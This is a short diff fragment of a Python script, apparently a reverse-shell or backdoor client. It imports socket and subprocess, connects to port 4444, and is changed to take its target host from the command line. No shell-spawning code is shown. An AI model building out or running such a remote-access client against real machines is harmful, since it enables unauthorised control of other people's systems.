@@ -3,10 +3,11 @@
 
 import socket
 import subprocess
-import os, time
+import os, sys
+import time
 
 # criando socket e conectando
-ip = "localhost"
+ip = sys.argv[1]
 ip = socket.gethostbyname(ip)
 port = 4444
 
